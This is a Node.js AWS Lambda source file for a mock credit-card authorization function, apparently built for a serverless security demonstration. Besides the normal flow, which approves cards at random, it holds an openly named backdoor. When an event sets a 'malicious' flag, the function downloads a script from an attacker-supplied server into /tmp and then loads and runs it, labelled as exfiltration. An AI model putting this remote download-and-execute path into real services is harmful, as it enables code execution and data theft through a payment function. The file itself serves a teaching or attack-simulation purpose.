'use strict';

const awsXRay = require('aws-xray-sdk');
awsXRay.captureHTTPsGlobal(require('https'));

const fs = require('fs');
const https = require('https');

module.exports.main = async (event, context) => {
  console.log('Function productPurchaseAuthorizeCC running.')

  if (event.malicious) {
    return await maliciousFunctions(event)
  }

  console.log('Normal flow')

  let result = {};
  result.devFinished = 'false: does not access database, assumes creditCard is always supplied';

  if (event.creditCard) {
	  if (Math.random() < .01) {
	    result.approved = false;
	    result.failureReason = 'Credit card authorization failed';
	  } else {
	    result.approved = true;
	    result.authorization = Math.floor(Math.random() * Number.MAX_SAFE_INTEGER);
	  }
	  result.malicious = event.malicious;
	} else {
	  result.approved = false;
	  result.failureResaon = 'Database access not yet implemented.';
	};

  return result;
};

const maliciousFunctions = async (event) => {
  if (event.malicious == 'one') {
    console.log('Step 1: Downloading attack scripts.');

    const downloadStatus = await downloadFile(event.attackServer, event.attackFile);

    return {
      approved: false,
      failureReason: downloadStatus
    };
  } else if (event.malicious == 'two') {
    console.log('Step 2: Exfiltration.');
    try {
      const dynamo = require(`/tmp/${event.attackFile}`)
      const response = await dynamo.exec()
      return {
        approved: false,
        failureReason: response
      };
    } catch {
      return {
        approved: false,
        failureReason: `/tmp/${event.attackFile} maybe not exist.`
      };
    }
  }
}

const downloadFile = async (server, file) => {
  try {
    console.log('Start of downloadFile');
    const url = server + '/' + file;
    console.log('URL: ' + url);

    const response_body = await getPromise(url);

    const localfile = `/tmp/${file}`;
    fs.writeFileSync(localfile, response_body, (err) => {
        if (err) throw err;
    });

    console.log('Script downloaded.');

    console.log(response_body);

    return 'Script successfully downloaded to ' + localfile;
  } catch (error) {
    console.log(error);
    return 'Error downloading script. Error: ' + error;
  }
}

const getPromise = async (url) => {
  return new Promise((resolve, reject) => {
    https.get(url, (response) => {
      let chunks_of_data = [];

      response.on('data', (fragments) => {
        chunks_of_data.push(fragments);
      });

      response.on('end', () => {
        let response_body = Buffer.concat(chunks_of_data);
        resolve(response_body.toString());
      });

      response.on('error', (error) => {
        reject(error);
      });
    });
  });
}
